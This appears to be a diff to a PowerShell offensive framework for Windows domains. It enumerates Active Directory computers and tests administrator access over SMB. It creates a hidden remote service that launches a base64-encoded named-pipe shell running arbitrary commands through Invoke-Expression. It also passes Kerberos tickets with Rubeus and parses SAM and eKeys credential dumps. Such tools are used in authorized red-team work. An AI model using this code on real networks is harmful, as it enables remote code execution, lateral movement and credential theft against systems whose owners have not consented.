@@ -265,13 +265,13 @@ $searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))
 if ($Targets -eq "Workstations") {
 
 $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-$computers = $searcher.FindAll() | Where-Object { $_.Properties["operatingSystem"][0]  -notlike "*windows*server*" -and $_.Properties["dnshostname"][0]-notmatch "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }
+$computers = $searcher.FindAll() | Where-Object { $_.Properties["operatingSystem"][0]  -notlike "*windows*server*" -and $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }
 
 }
 elseif ($Targets -eq "Servers") {
 
 $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-$computers = $searcher.FindAll() | Where-Object { $_.Properties["operatingSystem"][0]  -like "*server*" -and $_.Properties["dnshostname"][0]-notmatch "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }
+$computers = $searcher.FindAll() | Where-Object { $_.Properties["operatingSystem"][0]  -like "*server*" -and $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }
 
 }
 elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers") {
@@ -284,7 +284,7 @@ elseif ($Targets -eq "All" -or $Targets -eq "Everything") {
 
 
 $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-$computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0]-notmatch "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }`
+$computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }`
 
 }
 
@@ -1439,18 +1439,15 @@ if ($wait) {
 $tcpClient.Close()
 if (!$connected) {return "Unable to connect" }   
     
+$SMBCheck = $false
+$SMBCheck = Test-Path "\\$ComputerName\c$" -ErrorAction "SilentlyContinue"
 
-$Error.Clear()
-
-try {
-    ls "\\$ComputerName\c$" > $null
-
-    if ([string]::IsNullOrWhiteSpace($Command)) {
-        return "Successful Connection PME"
-    }
-}
-catch {
+if (!$SMBCheck) {
     return "Access Denied"
+}
+
+if ([string]::IsNullOrWhiteSpace($Command)) {
+    return "Successful connection PME"
 }
 
 
@@ -1489,60 +1486,38 @@ catch {
 	}
 	
 	$ServerScript = @"
-`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 4096, 4096, `$null)
-
+`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 1028, 1028, `$null)
 `$pipeServer.WaitForConnection()
-
 `$sr = New-Object System.IO.StreamReader(`$pipeServer)
 `$sw = New-Object System.IO.StreamWriter(`$pipeServer)
-
 while (`$true) {
-
-	# Check if client is still connected. If not, break.
 	if (-not `$pipeServer.IsConnected) {
 		break
 	}
-
 	`$command = `$sr.ReadLine()
-	
-	`$host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size(4096, `$Host.UI.RawUI.BufferSize.Height)
-
-	if (`$command -eq "exit") {
-		`$sw.WriteLine("Exiting...")
-		`$sw.Flush()
-		break
-	} 
-	
+	if (`$command -eq "exit") {break} 
 	else {
 		try{
 			`$result = Invoke-Expression `$command | Out-String
-
 			`$result -split "`n" | ForEach-Object {`$sw.WriteLine(`$_.TrimEnd())}
-		} 
-		
-		catch {
+		} catch {
 			`$errorMessage = `$_.Exception.Message
 			`$sw.WriteLine(`$errorMessage)
 		}
-
-		`$sw.WriteLine("###END###")  # Delimiter indicating end of command result
+		`$sw.WriteLine("###END###")
 		`$sw.Flush()
 	}
 }
-
 `$pipeServer.Disconnect()
-`$sr.Close()
-`$sw.Close()
+`$pipeServer.Dispose()
 "@
 	
 	$B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
-	$FullCommand = "`$encstring = `"$B64ServerScript`"; `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
-	$b64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
-	$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $b64command`""
+	$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
 	$startarguments = "\\$ComputerName start $ServiceName"
 	
 	Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
-	Start-Sleep -Milliseconds 200
+	Start-Sleep -Milliseconds 2000
 	Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
 	
 	# Get the current process ID
@@ -1620,6 +1595,9 @@ while (`$true) {
 	
 }
     return Enter-SMBSession -ComputerName $ComputerName -Command $Command
+
+
+
 
 }
 
@@ -4433,6 +4411,8 @@ Function RestoreTicket{
 if (!$CurrentUser) {
     if ($Method -ne "GenRelayList"){
     klist purge | Out-Null
+    Start-sleep -Milliseconds 100
+    klist purge | Out-Null
     Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
         
         }
@@ -4463,9 +4443,6 @@ switch ($Method) {
       
       }
  }
-
-
-
 
 if (!$NoParse){if ($Module -eq "SAM"){Parse-SAM}}
 if (!$NoParse){if ($Module -eq "eKeys"){Parse-eKeys}}
